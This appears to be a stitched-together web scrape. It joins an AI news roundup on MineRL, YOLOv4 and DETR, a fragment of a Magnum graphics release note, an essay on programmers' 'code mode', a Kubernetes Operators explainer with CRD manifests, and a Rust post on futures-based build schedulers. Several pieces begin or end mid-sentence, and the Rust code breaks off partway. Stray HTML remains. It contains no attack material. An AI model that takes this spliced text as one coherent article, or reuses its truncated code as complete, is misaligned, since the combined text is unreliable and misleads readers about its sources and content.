<h2>8. <a href="https://www.aicrowd.com/challenges/neurips-2020-minerl-challenge" target="_blank" rel="nofollow">Can AI play Minecraft?</a></h2>
<p>A new challenge has kicked off on AI Crowd. The goal? Teach an AI system to find a diamond in Minecraft.</p>
<p>Now, you see, I've never played Minecraft and never intend to. But this kind of challenge excites me.</p>
<p>If you want to get hands-on with a reinforcement learning project (if you do well, you'll probably be ripe for a job at OpenAI or DeepMind), check out the <a href="https://minerl.io/competition/" target="_blank" rel="nofollow">2020 MineRL challenge</a>.</p>
<h2>9. <a href="https://medium.com/@alexeyab84/yolov4-the-most-accurate-real-time-neural-network-on-ms-coco-dataset-73adfd3602fe" target="_blank" rel="nofollow">YOLOV4</a> — The state of the art real-time object detection model, You Only Look Once, is back (for a 4th time)</h2>
<p>If you ever want to announce that you're launching a state of the art machine learning algorithm, <a href="https://medium.com/@alexeyab84/yolov4-the-most-accurate-real-time-neural-network-on-ms-coco-dataset-73adfd3602fe" target="_blank" rel="nofollow">Aleksey Bochkovskiy's Medium article</a> should be your reference point.</p>
<p>The first paragraph says enough.</p>
<p>"Darket YOLOv4 is faster and more accurate than real-time neural networks Google TensorFlow EfficientDet and FaceBook Pytorch/Detectron RetinaNet/MaskRCNN on Microsoft COCO dataset."</p>
<p>This just goes to show, determined, small-group researchers can take on the likes of Google and Facebook.</p>
<h2>10. <a href="https://ai.facebook.com/blog/end-to-end-object-detection-with-transformers" target="_blank" rel="nofollow">End-to-end object detection with Transformers</a></h2>
<p>Speaking of object detection, Facebook just did it with a new style (well, a different model than what's usually used).</p>
<p>Transformers (a machine learning architecture) have been breaking all kinds of records in the NLP (natural language processing) space over the past year. Now they're making their way into computer vision.</p>
<p><a href="https://ai.facebook.com/blog/end-to-end-object-detection-with-transformers" target="_blank" rel="nofollow">DETR (short for detection transformer) is a transformer-based object …</a></p></div></div>

short­com­ings of <a href="https://en.cppreference.com/w/cpp/container/vector">std::vec­tor</a>, es­pe­cial­ly when it comes to cus­tom
al­lo­ca­tors. The im­ple­men­ta­tion present in 2020.06 is still miss­ing ar­bi­trary
in­ser­tion and dele­tion which is why it’s not ad­ver­tised in more de­tail yet —
once that’s done, ex­pect a ded­i­cat­ed ar­ti­cle to­geth­er with bench­marks and
com­par­i­son to com­mon im­ple­men­ta­tions. Un­til then, see
<a href="https://doc.magnum.graphics/corrade/classCorrade_1_1Containers_1_1Array.html#Containers-Array-growable">Grow­able ar­rays</a> for an in­tro­duc­tion.</p>
<p>One of the last re­main­ing pieces of STL that are <span>hold­ing us back</span> not as
light­weight &amp; flex­i­ble as I’d want them to be are <a href="https://en.cppreference.com/w/cpp/string/basic_string">std::string</a>s. Af­ter
the re­lease cut I de­cid­ed that new APIs are not go­ing to use those any­more,
which means a re­place­ment is un­der­way. Ex­ist­ing APIs will get grad­u­al­ly port­ed
away, sim­i­lar­ly as was done with <a href="https://en.cppreference.com/w/cpp/container/vector">std::vec­tor</a> or <a href="https://en.cppreference.com/w/cpp/memory/unique_ptr">std::unique_p­tr</a>
in the past. Of course, as al­ways, an <em>opt-in</em> com­pat­i­bil­i­ty of the new APIs
with <a href="https://en.cppreference.com/w/cpp/string/basic_string">std::string</a> / <a href="https://en.cppreference.com/w/cpp/string/basic_string_view">std::string_view</a> will be pro­vid­ed — the goal
is not to alien­ate users of stan­dard C++, the goal is to be flex­i­ble and
pro­vide al­ter­na­tives.</p>

<h2><a href="#what-s-new-in-plugins">What’s new in plug­ins</a></h2>
<p>The more Mag­num gets used to im­port a in­creas­ing­ly broad range of datasets in
var­i­ous for­mats, the more pre­vi­ous­ly un­han­dled cor­ner cas­es get dis­cov­ered and
fixed.</p>
<ul>
<li>The <a href="https://doc.magnum.graphics/magnum/classMagnum_1_1Trade_1_1AssimpImporter.html">As­simpIm­porter</a> now cor­rect­ly im­ports
mul­ti-prim­i­tive mesh­es, pre­serves al­pha in ma­te­ri­als and ac­counts for Y up
/ Z up ori­en­ta­tion over­ride, if a file de­fines it.</li>
<li>All im­porters now im­port both base col­or and tex­ture in­stead of ei­ther one
or the oth­er. In­ter­est­ing­ly, this was a lim­i­ta­tion that orig­i­nat­ed from the
COL­LA­DA for­mat — the ear­ly <a href="https://doc.magnum.graphics/magnum/namespaceMagnum_1_1Trade.html">Trade</a> APIs and the now-gone
<code>ColladaImporter</code> plug­in were mod­elled af­ter it, how­ev­er when re­view­ing
this de­sign de­ci­sion it turned out that COL­LA­DA is ac­tu­al­ly the on­ly for­mat
with such re­stric­tion and ev­ery oth­er for­mat (OBJ, glTF, OpenGEX, …)
sup­ports com­bin­ing both.</li>
<li><a href="https://doc.magnum.graphics/magnum/classMagnum_1_1Trade_1_1TinyGltfImporter.html">TinyGlt­fIm­porter</a> failed to im­port
in­ter­leaved mesh­es. This was a short­cut done to make the ear­ly
im­ple­men­ta­tion sim­pler. To my sur­prise, ap­par­ent­ly the vast ma­jor­i­ty of
glTF mod­els is ex­port­ed de-in­ter­leaved and thus in­ef­fi­cient for the GPU,
which ex­plains why this lim­i­ta­tion went large­ly un­no­ticed since the
orig­i­nal plug­in re­lease in 2018.</li>
</ul>
<p>Im­age im­porters weren’t left be­hind ei­ther — for­mats that sup­port it such as
DDS or Ba­sis Uni­ver­sal now can im­port par­tic­u­lar mip lev­els us­ing
<a href="https://doc.magnum.graphics/magnum/classMagnum_1_1Trade_1_1AbstractImporter.html#a9624991f2d46d5da6ec17e1c84d620aa">Trade::Ab­strac­tIm­porter::im­age2DLev­el­Count()</a> and the sec­ond pa­ram­e­ter of

you about longer-run­ning op­er­a­tions or pro­cess­ing stats. It’s prob­a­bly most
help­ful in case of As­simp, which likes to crash or mis­be­have on cer­tain files.</p>

    <h2>Code Mode</h2>

<p>It's been a wild week. You and your team have been engaged in an all-out war with the codebase for the past two spints. There's this new integration with a partner that's close to being shipped, and it promises bountiful revenue and voluminous web traffic. And you've been working on the part of it that'll seal the deal and let your squad deploy, come Monday morning.</p>

<p>You find yourself on the Friday night before launch, 6pm, absolutely fried at your desk. Everyone else on your team already left to attend the company happy hour, or has gone home seeking sanity from work. For the past several hours, you've been tracking down a nasty, horrendous bug that could prevent the feature from shipping next week.</p>

<p>But you introduced it.</p>

<p>Caught late in the game, with the marketing team eager to deploy, there were no other options. Thankfully, you're close to patching things up. Your thoughts have been a web of abstractions all night, looking something like this:</p>

<ul>
<li>I've looked at <code>SuperClass</code>, but the stack trace is from <code>ChildClass</code>.</li>
<li>Alright, so <code>ChildClass</code> imports the function from <code>HelperModule</code>...</li>
<li><code>HelperModule</code> uses a bunch of functions from <code>CrazyLibrary</code>. Let's do a search. Great, <code>CrazyLibrary</code> has no documentation.</li>
<li>Wait, did I check out the latest <code>master</code> yet?</li>
<li>Oh wait, the error wasn't actually on the server. Let's look at the client.</li>
<li><code>HugeReactComponent</code> is making the call. Maybe the <code>type</code> is wrong?</li>
<li>Oh man, it uses <code>DatabaseModernClientApi</code>... I don't know <code>DatabaseModernClientApi</code>.</li>
<li>Wait no, it's in <code>MiddlewareClientServer</code>...</li>
</ul>

<p><img src="https://miro.medium.com/max/2560/0*UxR4_Op7AExQz-Oo.png"></p>

<p>At 7:30pm, you're sure you've nailed it. It was a silly conditional that got in the way. Boom, problem solved. After merging a PR that switched the broken ternary statement around, off to the happy hour you go.</p>

<p>Beaming with pride from merging the bug fix, you walk in, and notice your team chatting with folks from a sister team. You recognize some members of the sister team, but not everyone. You go and try to introduce yourself.</p>

<blockquote>
<p>"Hey y'all, what's happening?!"</p>
</blockquote>

<p>Both your team and the sister team sheepishly smile at you. "Hey man", one of them says, "long day?" You look around, and suddenly notice that some people have startled looks on their faces. Then you realize they had been having a low-key conversation, and that you'd jumped into the conversation at quite the high decibel.</p>

<blockquote>
<p>"Yeah, haha", you play it off, "Oh boy, working on the <code>PartnerIntegrationProject</code> this week was awful! Whoever wrote <code>SuperClass</code> created a complete mess. Must've taken 10 hours away from my life."</p>
</blockquote>

<p>Everyone in the circle stops smiling. Eric, who wrote that class, nervously chuckles. "Yeah, I guess it could be better, huh?" Oops. Bad move. You feel the energy drain out of the conversation they were having.</p>

<p>You stay silent for the next half hour or so, and everyone keeps chatting, but it <em>feels</em> weird. You keep noticing people's expressions and body language. There's some more forced conversation before a few folks excuse themselves. Then everyone disperses.</p>

<p>And for the rest of the evening, you can't shake off the feeling that everyone's thinking something about you. That you did something wrong. You get a sense that the energy was off, and blame yourself.</p>

<p>But you're not to blame! Everything was probably fine, and no one was judging you. You were just in <strong>code mode</strong>.</p>

<h2>What Happens In Your Brain When You Program?</h2>

<p>Ask any developer, and "code mode" is a real thing. We seem to be so drawn into our innermost thoughts of <code>classes</code>, <code>modules</code>, <code>syntax</code>, and <code>systems</code>-- that we lose track of how to mentally function the rest of the time. Some call it "monkey mind" or restlessness, but we all recognize it. It's the brain on hyperdrive, going 200 miles per hour when the speed limit's about 50.</p>

<p>It's the thinking, or rather, <em>the overthinking</em>, that is almost always unnecessary. And for reasons unbeknownst, this always tends to happen when we need to deal with other people.</p>

<p><img src="https://i.imgur.com/95NZpPy.png"></p>

<p>Now, that doesn't seem problematic, right? Being stuck in code mode is harmless. So you overthink the occasional small talk session, and can't really pay attention to long films, but is it really harmful?</p>

<p>No, not really. But understanding why it happens helps us understand how to make the gear switch a little bit smoother, which is behind my upcoming pitch for meditation. If you're able to leave the programmatic thought patterns behind anytime you'd like, you have greater control over your life.</p>

<p>Of course, we want to be sure of our assumptions. After all, the argument for meditation requires a somewhat well-formed paradigm of what's happening when we read and write code. It's important to take into account exactly which thought patterns we "execute" <strong>while</strong> in code mode.</p>

<h2>What's Going On Up There?</h2>

<p>There was a push in recent years to allow programming to replace the study of a foreign language. Around that time, <a href="https://par.nsf.gov/servlets/purl/10085745%20conducted%20a%20study%20that%20observed%2017%20participants%20in%20an%20fMRI%20scanner" rel="nofollow" target="_blank">Norman Peitek, Janet Siegmund, and a team of researchers</a> while they were comprehending short source-code snippets. Their key finding was that despite the stereotype of math and logic being the major concern in programming, the brains of the participants showed greater activation of its language centers than expected.</p>

<p>Now, this may be confusing to you, as it seemingly contradicts <em>the idea of code mode</em>. After all, if the language centers are activated, shouldn't we, as social beings who communicate through the use of language, not be affected by these lingering cognitive thought patterns?</p>

<p>This could be so. But if we dig deeper into the results of the sudy, we actually find that the programmer mind is activated more traditionally than the above finding would suggest:</p>

<blockquote>
<p>In essence, we found five relevant activation clusters, all in the left hemisphere.</p>
</blockquote>

<p>The function of the left hemisphere is thought to be for control of the right side of the body, and "is the more academic and logical side of the brain". The right hemisphere is associated with creativity, visual/spatial perception, and emotional management and expression.</p>

<p>Because this <a href="https://now.northropgrumman.com/the-left-brain-right-brain-myth-is-it-true/" rel="nofollow" target="_blank">has been disputed recently</a>, I took a look at what naysayers of the "left-brain, right-brain myth" were saying. It turns out, most of the rejection of this "myth" stems from the fact that <em>people are not usually left-brain or right-brain dominant</em>. However, the fact of the matter is, the left hemisphere is <strong>still associated</strong> with logical operations and analytical functions, and the right with more "emotional" or "creative" activities.</p>

<blockquote>
<p>In fact, a 2013 University of Utah study on brain lateralization examined the brains of more than 1,000 people and found no evidence for people having a dominant side of the brain. <em>Even though each side of the brain does more work for certain functions</em>, such as language being localized on the left and attention on the right, this doesn’t vary by person. All of the study participants, whether they were engineers or musicians, used their entire brain equally, debunking the left-brain right-brain myth.</p>
</blockquote>

<p>In addition to programming being left hemisphere dominant, there's also a lot going on. The earlier study referenced found that the activated regions while coding found were:</p>

<ol>
<li>Middle frontal gyrus (division of attention, silent word reading, verbal/numeric problem solving)</li>
<li>Middle temporal gyrus (categorization)</li>
<li>Inferior parietal lobule (verbal/numeric problem solving)</li>
<li>Inferior frontal gyrus (verbal/numeric)</li>
<li>Inferior frontal gyrus (silent word reading, problem solving)</li>
</ol>

<p>If this sounds like a surprisingly high amount of brain activity merely for <em>understanding source code</em>, I would agree. And if it sounds like you'd be surprised if all this happened when trying to sleep or talking to a friend, you'd probably be right. Thus, I'd argue that one should choose to believe that quite a bit is going in mentally when we program, and mostly in the left hemisphere.</p>

<h2>But Isn't It Fun?</h2>

<p>An interesting note to add is that this kind of intensive brain activity sounds painful in a challenging way, but is actually desirable. Many call it the "flow" state. Courtland Allen and Vincent Woo <a href="https://www.indiehackers.com/podcast/041-vincent-woo-of-coderpad" rel="nofollow" target="_blank">talked about it in their interview on IndieHackers</a>:</p>

<p>Courtland says:</p>

<blockquote>
<p>That's funny because it reminds me of the first two years after I moved to San Francisco. I started a startup and I basically just coded for sixteen hours a day, every day for two years, and the problem is that if you're in flow for that long and you don't vary your activities... you don't make new memories, everything just blurs together, so I have a two year block of time in my life where there were zero memories, and I swore that I would never do that again.</p>
</blockquote>

<p>To which Vincent replies:</p>

<blockquote>
<p>That's kind of what I suspected happened to that sixty year old plus guy at Amazon, I think he just sat down to code one day and then he woke up, and he was sixty. I don't know, I think flow is both really seductive and also kind of boring in it's own way.</p>
</blockquote>

<p>A fascinating take-away of the above conversation is the conflation of two different ideas: <code>flow</code> state and <code>code mode</code>. From our good friend, <a href="https://en.wikipedia.org/wiki/Flow_(psychology)" rel="nofollow" target="_blank">Wikipedia</a>:</p>

<blockquote>
<p>In positive psychology, a flow state, also known colloquially as being in the zone, is the mental state in which a person performing an activity is fully immersed in a feeling of energized focus, full involvement, and enjoyment in the process of the activity.</p>
</blockquote>

<p>Here, I argue this point, and I want to be succint: <code>flow</code> and <code>code mode</code> appear to be two sides of the same coin. That specific coin is neurotransmitter-fueled activity, causing us to hone in one problem (or consecutive problems) for an indefinite period of time. However, we generally use the term <code>flow</code> to refer to the good parts of it, and I'm using <code>code mode</code> as the detrimental aspect.</p>

<p>I think we'd all agree that <a href="https://algodaily.com/lessons/solving-the-health-problems-of-software-engineers" rel="nofollow" target="_blank">16 hours spent on something is not good for your health</a>, mentally or physically. Especially <a href="https://www.amazon.com/gp/product/0321751043/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=algodaily03-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0321751043&amp;linkId=6fb078bf069b7f8eb648902d5923ab87" rel="nofollow" target="_blank">the art of programming</a>-- your back aches, your eyes burn, and you leave the coding session feeling unsatisfied. This is what we want to avoid, and the mental fatigue this imparts on you will carry over to other parts of life.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Have you ever wondered how effective Site Reliability Engineering (SRE) teams manage complex applications successfully? In the Kubernetes ecosystem, there is only one answer: Kubernetes Operators! In this article, we will examine both what they are and how they work.</p><div><p>The Kubernetes Operator concept was developed by engineers at CoreOS in 2016 as an advanced and native way of building and driving every application on the Kubernetes cluster, which needs domain-specific knowledge. It provides a consistent approach to handle all application operational processes automatically, without any human reaction via close cooperation with the Kubernetes API. In other words, an operator is a way of packaging, running, and managing Kubernetes applications.</p><p>The Kubernetes Operator pattern acts in accordance with one of the core Kubernetes principles: <a href="https://en.wikipedia.org/wiki/Control_theory">the control theory</a>. In robotics and automation, it is a mechanism that continuously operates dynamical systems. It relies on an ability to quickly tailor the workload demand to the available resources as accurately as possible. The objective is to develop a control model with the necessary logic to help an application or system remain stable. In Kubernetes world, that part is handled by controllers.</p><p>A controller is a special software that, in the loop, responds to changes and performs adaptation actions in the cluster. The first Kubernetes controller was a kube-controller-manager. It is regarded as an ancestor for all operators, which were built later.</p><h2 id="what-is-a-controller-loop">What Is a Controller Loop?</h2><p>To put it simply, controller loops are the base of controller actions. Imagine there is a non-terminating process (called a reconciliation loop, in Kubernetes) happening over and over again, as in the following illustration:</p><a href="#kubernetes-operators-reconciliation-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-reconciliation-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/4d00a0df53a752d79d89dbdf5f9da2b36f5167b3/b8cdc/img/blog/kubernetes-operators-reconciliation-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>This process observes at least one Kubernetes <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/#kubernetes-objects">object</a>, which contains information about the desired state. Objects such as …</p><ul><li>Deployments,</li><li>Services,</li><li>Secrets,</li><li>Ingress,</li><li>Config Maps,</li></ul><p>… are defined by configuration files made up of manifests in JSON or YAML. Then the controller(s) makes a continuous adjustment via Kubernetes API to imitate the desired state until the current state becomes the desired state, according to the built-in logic.</p><p>In that way, Kubernetes deals with the dynamic nature of Cloud Native systems, by handling a constant change. Examples of modifications perform to achieve expected state include:</p><ul><li>Noticing when nodes go down and demanding a new one.</li><li>Checking if pods need to be replicated.</li><li>Creating a new load-balancer, if requested.</li></ul><h2 id="how-does-a-kubernetes-operator-work">How Does a Kubernetes Operator Work?</h2><p>An operator is an application-specific controller. It extends a Kubernetes API to create, configure, and manage complex applications on behalf of humans (operation engineers or site reliability engineers). Let’s see what Kubernetes documentation says about it.</p><blockquote><p><em>Operators are software extensions to Kubernetes that make use of custom resources to manage applications and their components. Operators follow Kubernetes principles, notably the control loop.</em> - <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/operator/">Kubernetes Documentation</a></p></blockquote><p>So far, you know that operators take advantage of controllers that observe Kubernetes objects. These controllers are a bit different because they are tracing custom objects, often called custom resources (CR). CR is an extension of the Kubernetes API that provides a place where you can store and retrieve structured data—the desired state of your application. The whole principle of operation is presented in the diagram below.</p><a href="#kubernetes-operators-controller-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-controller-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/63c39aec0db28d70ff470c5aec042c5301b8bc3e/93486/img/blog/kubernetes-operators-controller-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>The Operator continuously tracks cluster events relating to a specific type of custom resource. The types of events on these custom resources that can be tracked are:</p><ul><li>Add,</li><li>Update,</li><li>Delete.</li></ul><p>When the operator receives any information, it will take action to adjust the Kubernetes cluster or external system to the desired state as part of its reconciliation loop in the custom controller.</p><h2 id="how-to-add-a-custom-resource">How to add a custom resource?</h2><p>A custom resource extends Kubernetes capabilities by adding new kinds of objects that can be helpful for your application. Kubernetes provides two ways to add custom resources to clusters:</p><ul><li><strong>via API Aggregation</strong>, an advanced method that requires you to build your own API Server, but will give you more control</li><li><strong>via Custom Resource Definitions (CRD)</strong>, a simple way that can be created without any programming knowledge, as an extension to the original Kubernetes API server.</li></ul><p>These two options meet the needs of different users, who can choose between flexibility and ease of use. The Kubernetes community created a <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#choosing-a-method-for-adding-custom-resources">comparison</a> that will help you decide what method is right for you, but the most popular choice is CRD.</p><h3 id="custom-resource-definitions">Custom Resource Definitions</h3><p>Custom Resource Definitions have been around for quite some time now; the first major API specification was released with Kubernetes 1.16.0. The manifest below presents an example:</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: apiextensions.k8s.io/v1beta1
<span>kind</span>: CustomResourceDefinition
<span>metadata</span>:
  <span>name</span>: application.stable.example.com
<span>spec</span>:
  <span>group</span>: stable.example.com
  <span>version</span>: v1
  <span>scope</span>: Namespaced
  <span>names</span>:
    <span>plural</span>: application
    <span>singular</span>: applications
    <span>kind</span>: Application
    <span>shortNames</span>:
      - app
</code></pre></div><p>This CRD will allow you to create a CR called <em>Application</em>. (We are going to use it in the next section.) The first two lines define what <code>apiVersion apiextensions.k8s.io/v1beta1</code> of object kind <code>CustomResourceDefinition</code> you want to create.</p><p>The metadata describes the name of the resource, but the most important place here is the field <em>spec</em>. It lets you specify the group and version and the scope of visibility - namespaced or cluster-wide.</p><p>Afterwards, you define names in multiple formats and create a handy short name, which lets you perform a command <code>kubectl get app</code> to get the existing CR.</p><h3 id="custom-resource">Custom Resource</h3><p>The CRD above allows you to create the following manifest of a custom resource.</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: stable.example.com/v1
<span>kind</span>: Application
<span>metadata</span>:
  <span>name</span>: application-config
<span>spec</span>:
  <span>image</span>: container-registry-image:v1<span>.0.0</span>
  <span>domain</span>: teamx.yoursaas.io
  <span>plan</span>: premium
</code></pre></div><p>As you can see, we can contain here all the necessary information required to run an application for a specific case. This custom resource will be observed by our operator - to be precise, by the operator’s custom controller. According to the built-in logic in the controller, the necessary actions will imitate the desired state. It can create a Deployment, Service, and necessary ConfigMaps for our application. Run it and expose it via ingress on a specific domain. This is just an example of a use case, but it can do whatever is designed.</p><p>Operators can also be used to provision resources that live outside Kubernetes. You can control the provisioning of external routers or create a database in the cloud without leaving the Kubernetes platform.</p><h2 id="kubernetes-operators-a-case-study">Kubernetes Operators: a Case Study</h2><p>To have a whole clear picture of Kubernetes Operators, let’s examine a <a href="https://github.com/coreos/prometheus-operator">Prometheus Operator</a>, one of the first and most popular operators. It simplifies the deployment and configuration of Prometheus, Alertmanager, and related monitoring components.</p><p>The core feature of the Prometheus Operator is to monitor the Kubernetes API server for changes to specific objects and ensure that the current Prometheus deployments match these objects. The Operator acts on the following Custom Resource Definitions (CRDs):</p><ul><li><strong>Prometheus</strong>, which defines a desired Prometheus deployment.</li><li><strong>Alertmanager</strong>, which defines a desired Alertmanager deployment.</li><li><strong>ServiceMonitor</strong>, which declaratively specifies how groups of Kubernetes services should be monitored. The Operator automatically generates Prometheus scrape configuration based on the current state of the objects in the API server.</li><li><strong>PodMonitor</strong>, which declaratively specifies how a group of pods should be monitored. The Operator automatically generates Prometheus scrape configuration based on the current state of the objects in the API server.</li><li><strong>PrometheusRule</strong>, which defines a desired set of Prometheus alerting and/or recording rules. The Operator generates a rule file, which can be used by Prometheus instances.</li></ul><p>The Prometheus Operator automatically detects changes in the Kubernetes API server to any of the above objects, and ensures that matching deployments and configurations are kept in sync.</p><h2 id="need-more">Need more?</h2><p>If you would like to hear more about how to extend Kubernetes, take a look at this talk from one of my Container Solutions colleagues, Adam Otto, from <a href="https://cloudnativewarsaw.com/">Cloud Native Warsaw Conference</a>.</p><p><iframe width="560" height="315" src="https://www.youtube.com/embed/8QoCL1NCVv4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><hr><p>The article has been originally published on the <a href="https://blog.container-solutions.com/kubernetes-operators-explained">Container Solutions</a> blog.</p></div></div>]]>

<p>This is another blog post related to the <a href="https://www.microsoft.com/en-us/research/publication/build-systems-la-carte/">Build Systems à la Carte</a> paper. See <a href="https://nikhilism.com/post/2020/type-classes-build-systems/">Using type-classes to model the expressivity of build systems</a> for the first one.</p>

<p>The paper proposes splitting build systems into two components:</p>

<ol>
<li><strong>Rebuilders</strong> decide when to rebuild a particular key (file).</li>
<li><strong>Schedulers</strong> decide <em>how</em> to rebuild multiple keys - handling dependencies while maintaining correctness and efficiency.</li>
</ol>

<p>Schedulers come in 3 flavors (see Section 4):</p>

<ol>
<li><strong>Topological</strong> use a simple topological sort to determine the order of building keys. They are limited to static dependencies - if new dependencies are discovered during the build process, they cannot be correctly added to the build graph.</li>
<li><strong>Restarting</strong> schedulers start building a particular key, then, as dependencies are discovered, abort building that key. Then the discovered dependency(ies) are built, after which the original key’s task is restarted. This allows dynamic dependencies, but at the cost of repeating parts of the build process.</li>
<li><strong>Suspending</strong> schedulers also start building a particular key. When a dependency is discovered, instead of aborting the current task, they suspend it, go and build the dependency, then resume the task. This allows dynamic dependencies without repeating work.</li>
</ol>

<p>Section 4.3 says:</p>

<blockquote>
<p>This scheduler (when combined with a suitable rebuilder) provides a minimal
build system that supports dynamic dependencies. In our model, a suspending
scheduler is easy to write – it makes a function call to compute each
dependency. However, a more practical implementation is likely to build
multiple dependencies in parallel, which then requires a more explicit task
suspension and resumption. To implement suspension, there are two standard
approaches:</p>

<ul>
<li><p>Blocking threads or processes: this approach is relatively easy, but can
require significant resources, especially if a large number of tasks are
suspended. In languages with cheap green threads (e.g. Haskell), the
approach is more feasible and it was the original approach taken by SHAKE.</p></li>

<li><p>Continuation-passing style (Claessen, 1999) can allow the remainder of a
task to be captured, paused, and resumed later. Continuation passing is
efficient, but requires the build script to be architected to allow
capturing continuations. SHAKE currently uses this approach.</p></li>
</ul>

<p>While a suspending scheduler is theoretically optimal, in practice, it is
better than a restarting scheduler only if the cost of avoided duplicate work
outweighs the cost of suspending tasks. Note, furthermore, that the cost of
duplicate work may often be just a fraction of the overall build cost.</p>
</blockquote>

<p>I want to show that an implementation of such a scheduler is “trivially”
possible using Futures (Promises for JS folks) and provides the nice property
of automatically giving parallelism, without any need for explicit suspension
and resumption. We do not need to perform any transformations to code. Instead
almost everything is written in a very imperative, blocking style, with
async/await handling the suspension mechanics. Using futures means that we
do not need a thread/process per active task. Since builds are generally I/O
bound and more importantly, running separate processes than the build process,
this means we can even get away with just one actual OS thread running all
currently active futures.</p>

<p>With a “sophisticated” (I don’t know a better word) futures implementation such
as in Rust, you can even make reasonable claims about the memory usage and
allocation patterns of such an implementation, which can help you answer
whether “the cost of avoided duplicate work outweighs the cost of suspending
tasks”.</p>



<p>I am going to focus on a “build system” that has these requirements:</p>

<ol>
<li><p>It is going to launch arbitrary external processes. This generally makes the
cost of suspending pretty small compared to the cost of restarting.</p></li>

<li><p>We want parallelism because this is 2020. At the same time, we want to bound
this parallelism to avoid overloading a machine.</p></li>
</ol>

<p>Just like in a real build system, our tasks can:</p>

<ol>
<li>Depend on N tasks, and cannot begin until all N of those tasks are done. The
code does assume all tasks always succeed, which is not true in reality.</li>
<li>Share common dependencies, so that multiple tasks should be able to block on
a single task.</li>
</ol>

<blockquote>
<p>The examples below use
<a href="https://tokio.rs/docs/getting-started/hello-world/">tokio</a> and
<a href="https://docs.rs/futures/0.3.5/futures/index.html">futures</a> to implement the
runtime and various useful features. They will only run on UNIX since they use a shell.</p>
</blockquote>

<h2 id="simple-suspension">Simple suspension</h2>

<p><a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=85cde96a0bbd4d3f26b5eceea490e338">Full code in the Rust playground</a></p>

<p>Let’s start small. This one just demonstrates setting up dependencies so that a task waits until they are all done.</p>

<p>First we have a wall of imports, most of which we will only use later.</p>

<div><pre><code data-lang="rust"><span>#![allow(unused_imports)]</span><span>
</span><span>
</span><span></span><span>use</span><span> </span>futures::future::join_all;<span>
</span><span></span><span>use</span><span> </span>futures::future::FutureExt;<span>
</span><span></span><span>use</span><span> </span>futures::stream::FuturesUnordered;<span>
</span><span></span><span>use</span><span> </span>futures::stream::StreamExt;<span>
</span><span></span><span>use</span><span> </span>std::rc::Rc;<span>
</span><span></span><span>use</span><span> </span>tokio::process::Command;<span>
</span><span></span><span>use</span><span> </span>tokio::runtime::Builder;<span>
</span><span></span><span>use</span><span> </span>tokio::sync::Semaphore;<span>
</span></code></pre></div>

<p>Then, a couple of utility functions to create a command and to actually start the process and obtain a future to monitor when the process is done.</p>

<div><pre><code data-lang="rust"><span>fn</span> <span>command</span><span>&lt;</span>S: <span>Into</span><span>&lt;</span><span>String</span><span>&gt;&gt;</span>(cmdstr: <span>S</span>)<span> </span>-&gt; <span>Command</span><span> </span>{<span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span>cmd<span> </span><span>=</span><span> </span>Command::new(<span>"/bin/sh"</span>);<span>

<p>An async function in Rust does not actually start running as soon as it is
called. Instead, it is desugared to return a Future that has “yield points”
introduced at await calls. <a href="https://os.phil-opp.com/async-await/">This is an excellent explanation of how Rust
async/await works</a>. The process will only
be launched when <code>status()</code> executes.</p>

<p>A final bit of setup is to create a runtime in which to run the future. This is
a Rust-ism and is not really present in other languages, where it is handled
transparently by the runtime. As I said before, since we are launching
processes which will do the actual work, we aren’t going to use a thread-pool
<sup id="fnref:1"><a href="#fn:1">1</a></sup>. So we select the <a href="https://docs.rs/tokio/0.2.21/tokio/runtime/struct.Builder.html#method.basic_scheduler">tokio basic
runtime</a>.
Since our demo program doesn’t do anything else, we can just block on the one
async block, and exit as soon as that is done. This section won’t get into much
of the Rust-specific code. See <a href="#implementation-details">the implementation details</a>.</p>

<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>()<span> </span>{<span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span>runtime<span> </span><span>=</span><span> </span>Builder::new()<span>
</span><span>        </span>.basic_scheduler()<span>
</span><span>        </span>.enable_all()<span>
</span><span>        </span>.build()<span>
</span><span>        </span>.unwrap();<span>
</span><span>    </span><span>let</span><span> </span>local_set<span> </span><span>=</span><span> </span>tokio::task::LocalSet::new();<span>

